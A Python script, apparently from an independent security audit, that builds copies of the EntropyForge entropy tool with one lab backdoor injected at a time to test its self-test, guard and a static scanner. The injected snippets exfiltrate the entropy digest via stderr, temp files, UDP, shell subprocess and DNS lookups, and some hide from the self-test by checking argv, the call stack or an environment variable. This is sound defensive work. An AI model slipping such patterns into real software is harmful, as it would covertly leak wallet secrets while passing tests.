#!/usr/bin/env python3
"""Laboratorio de backdoors (Fase 6 da auditoria independente).

Gera copias COMPLETAS de `entropyforge/` com UM backdoor de laboratorio
inserido por vez. Cada copia e usada para testar:

  (a) se `selftest` (do proprio EntropyForge, possivelmente comprometido)
      continua reportando sucesso;
  (b) se o analisador estatico externo (`independent-verifier/verifier/static_scan.py`)
      encontra algo suspeito;
  (c) sob observacao externa de processo (strace/sandbox), o que o
      backdoor realmente faz.

NENHUM backdoor aqui usa dados reais. Toda "entropia"/"segredo" vazado e
o valor de E calculado a partir de uma sequencia de teste publica
(ver `redteam/independent/scripts/run_backdoor_lab.py`), nunca uma seed
de carteira de verdade.

Os backdoors sao inseridos de duas formas, deliberadamente:

  - a maioria em `entropyforge/combine.py`, DEPOIS que `guard.activate()`
    ja rodou no fluxo real (`__main__.py` ativa o guard antes de importar
    `cli`, que importa `combine`) -- entao qualquer tentativa de rede/
    disco/subprocess feita aqui e BLOQUEADA pelo proprio guard do
    EntropyForge, nao pelo verificador externo. Isto e proposital: mostra
    o valor real do audit hook.
  - o BACKDOOR_06 e inserido em `entropyforge/__init__.py`, que roda
    ANTES de `guard.activate()` poder ser chamado (o proprio codigo de
    `entropyforge/__main__.py` documenta essa janela). Isto demonstra a
    UNICA janela em que codigo malicioso no pacote escapa do audit hook
    do proprio projeto.
"""
from __future__ import annotations

import shutil
from dataclasses import dataclass
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[4]
ENTROPYFORGE_SRC = REPO_ROOT / "entropyforge"

MARKER_COMBINE = "    digest = hashlib.sha256(a + b).digest()\n"

# Todo backdoor grava, quando ativado, uma linha reconhecivel comecando
# com este prefixo -- isto so existe para o LABORATORIO conseguir
# confirmar que o backdoor de fato executou (nao e como um backdoor real
# se identificaria; um atacante de verdade nao adicionaria um marcador
# assim).
LAB_MARKER = "INDEPENDENT_VERIFIER_LAB_BACKDOOR"


@dataclass(frozen=True)
class Backdoor:
    id: str
    title: str
    description: str
    target_file: str
    build: "callable"  # (source_text: str) -> str


def _inject_after_combine_digest(source: str, injected_lines: str) -> str:
    if MARKER_COMBINE not in source:
        raise RuntimeError("ponto de insercao esperado nao encontrado em combine.py")
    return source.replace(MARKER_COMBINE, MARKER_COMBINE + injected_lines, 1)


def _backdoor_01_stderr(source: str) -> str:
    injected = (
        "    import sys as _lab_sys\n"
        f"    _lab_sys.stderr.write('{LAB_MARKER}_01:' + digest.hex() + chr(10))\n"
    )
    return _inject_after_combine_digest(source, injected)


def _backdoor_02_tmpfile(source: str) -> str:
    injected = (
        "    try:\n"
        "        with open('/tmp/.ef_lab_backdoor_02.bin', 'wb') as _lab_f:\n"
        "            _lab_f.write(digest)\n"
        "    except Exception as _lab_exc:\n"
        "        import sys as _lab_sys\n"
        f"        _lab_sys.stderr.write('{LAB_MARKER}_02_BLOCKED:' + repr(_lab_exc) + chr(10))\n"
    )
    return _inject_after_combine_digest(source, injected)


def _backdoor_03_socket(source: str) -> str:
    injected = (
        "    try:\n"
        "        import socket as _lab_socket\n"
        "        _s = _lab_socket.socket(_lab_socket.AF_INET, _lab_socket.SOCK_DGRAM)\n"
        "        _s.sendto(digest, ('127.0.0.1', 9))\n"
        "    except Exception as _lab_exc:\n"
        "        import sys as _lab_sys\n"
        f"        _lab_sys.stderr.write('{LAB_MARKER}_03_BLOCKED:' + repr(_lab_exc) + chr(10))\n"
    )
    return _inject_after_combine_digest(source, injected)


def _backdoor_04_subprocess(source: str) -> str:
    injected = (
        "    try:\n"
        "        import subprocess as _lab_subprocess\n"
        "        _lab_subprocess.run(['/bin/sh', '-c', 'echo ' + digest.hex() + ' > /tmp/.ef_lab_04'])\n"
        "    except Exception as _lab_exc:\n"
        "        import sys as _lab_sys\n"
        f"        _lab_sys.stderr.write('{LAB_MARKER}_04_BLOCKED:' + repr(_lab_exc) + chr(10))\n"
    )
    return _inject_after_combine_digest(source, injected)


def _backdoor_05_dns(source: str) -> str:
    injected = (
        "    try:\n"
        "        import socket as _lab_socket\n"
        "        _host = digest.hex()[:32] + '.lab.invalid'\n"
        "        _lab_socket.getaddrinfo(_host, 80)\n"
        "    except Exception as _lab_exc:\n"
        "        import sys as _lab_sys\n"
        f"        _lab_sys.stderr.write('{LAB_MARKER}_05_BLOCKED:' + repr(_lab_exc) + chr(10))\n"
    )
    return _inject_after_combine_digest(source, injected)


def _backdoor_07_argv_selftest(source: str) -> str:
    # comportamento malicioso SO fora de selftest: olha sys.argv
    injected = (
        "    import sys as _lab_sys\n"
        "    if 'selftest' not in _lab_sys.argv:\n"
        f"        _lab_sys.stderr.write('{LAB_MARKER}_07_ONLY_OUTSIDE_SELFTEST:' + digest.hex() + chr(10))\n"
    )
    return _inject_after_combine_digest(source, injected)


def _backdoor_08_callstack_selftest(source: str) -> str:
    # detecta selftest inspecionando a PILHA DE CHAMADAS (mais dificil de
    # mascarar so trocando argv), nao sys.argv: procura por nomes de
    # funcao do proprio selftest.py em qualquer quadro da pilha atual.
    injected = (
        "    import inspect as _lab_inspect, sys as _lab_sys\n"
        "    _selftest_frame_names = {'run_selftest', '_check', '_check_combine_matches_raw_sha256'}\n"
        "    _in_selftest = any(\n"
        "        frame.function in _selftest_frame_names for frame in _lab_inspect.stack()\n"
        "    )\n"
        "    if not _in_selftest:\n"
        f"        _lab_sys.stderr.write('{LAB_MARKER}_08_ONLY_OUTSIDE_SELFTEST_STACK:' + digest.hex() + chr(10))\n"
    )
    return _inject_after_combine_digest(source, injected)


def _backdoor_09_env_var(source: str) -> str:
    injected = (
        "    import os as _lab_os, sys as _lab_sys\n"
        "    if _lab_os.environ.get('ENTROPYFORGE_LAB_SELFTEST') != '1':\n"
        f"        _lab_sys.stderr.write('{LAB_MARKER}_09_ENV_GATED:' + digest.hex() + chr(10))\n"
    )
    return _inject_after_combine_digest(source, injected)


def _backdoor_10_atexit(source: str) -> str:
    injected = (
        "    import atexit as _lab_atexit\n"
        "    def _lab_exfil(_captured=digest.hex()):\n"
        "        import sys as _lab_sys\n"
        f"        _lab_sys.stderr.write('{LAB_MARKER}_10_ATEXIT:' + _captured + chr(10))\n"
        "    _lab_atexit.register(_lab_exfil)\n"
    )
    return _inject_after_combine_digest(source, injected)


def _backdoor_06_pre_guard_init(source: str) -> str:
    # ESTE backdoor nao mexe em combine.py -- mexe em __init__.py, que
    # roda ANTES de guard.activate() poder ser chamado (ver docstring do
    # modulo). Aqui ele consegue de fato escrever em disco, porque o
    # audit hook ainda nao existe neste ponto da execucao.
    injected = (
        "\n"
        "# --- INDEPENDENT_VERIFIER_LAB_BACKDOOR_06 (roda ANTES de guard.activate()) ---\n"
        "try:\n"
        "    with open('/tmp/.ef_lab_backdoor_06_ran_pre_guard.txt', 'w') as _lab_f:\n"
        "        _lab_f.write('este arquivo so existe se codigo em __init__.py rodou antes do guard\\n')\n"
        "except Exception:\n"
        "    pass\n"
    )
    return source + injected


BACKDOORS: list[Backdoor] = [
    Backdoor("01", "Exfiltracao via stderr", "gera o resultado correto; escreve a entropia combinada em stderr", "combine.py", _backdoor_01_stderr),
    Backdoor("02", "Copia em /tmp", "gera o resultado correto; tenta gravar uma copia da entropia em /tmp", "combine.py", _backdoor_02_tmpfile),
    Backdoor("03", "Socket UDP", "gera o resultado correto; tenta abrir um socket e enviar a entropia", "combine.py", _backdoor_03_socket),
    Backdoor("04", "Subprocess", "gera o resultado correto; tenta usar subprocess para gravar a entropia via shell", "combine.py", _backdoor_04_subprocess),
    Backdoor("05", "Exfiltracao via DNS", "gera o resultado correto; tenta resolver um hostname contendo a entropia", "combine.py", _backdoor_05_dns),
    Backdoor("06", "Payload pre-guard em __init__.py", "roda ANTES de guard.activate() existir; escreve em disco sem ser bloqueado", "__init__.py", _backdoor_06_pre_guard_init),
    Backdoor("07", "Condicional a argv (so fora de selftest)", "verifica sys.argv; comportamento malicioso so quando 'selftest' nao esta nos argumentos", "combine.py", _backdoor_07_argv_selftest),
    Backdoor("08", "Condicional a pilha de chamadas", "inspeciona a pilha de chamadas para detectar se esta rodando dentro do selftest", "combine.py", _backdoor_08_callstack_selftest),
    Backdoor("09", "Condicional a variavel de ambiente", "so se comporta soretiro quando uma variavel de ambiente magica esta ausente", "combine.py", _backdoor_09_env_var),
    Backdoor("10", "Exfiltracao via atexit", "registra um handler atexit que escreve a entropia ao sair do processo", "combine.py", _backdoor_10_atexit),
]

BACKDOORS_BY_ID = {b.id: b for b in BACKDOORS}


def materialize_backdoor(backdoor_id: str, dest_root: Path) -> Path:
    """Cria uma copia completa de `entropyforge/` em `dest_root/entropyforge`
    com o backdoor `backdoor_id` inserido. Devolve o caminho da copia."""
    backdoor = BACKDOORS_BY_ID[backdoor_id]
    dest = dest_root / "entropyforge"
    if dest.exists():
        shutil.rmtree(dest)
    shutil.copytree(ENTROPYFORGE_SRC, dest)

    target = dest / backdoor.target_file
    source = target.read_text(encoding="utf-8")
    mutated = backdoor.build(source)
    if mutated == source:
        raise RuntimeError(f"backdoor {backdoor_id} nao alterou {backdoor.target_file}")
    target.write_text(mutated, encoding="utf-8")
    return dest


def materialize_clean(dest_root: Path) -> Path:
    dest = dest_root / "entropyforge"
    if dest.exists():
        shutil.rmtree(dest)
    shutil.copytree(ENTROPYFORGE_SRC, dest)
    return dest
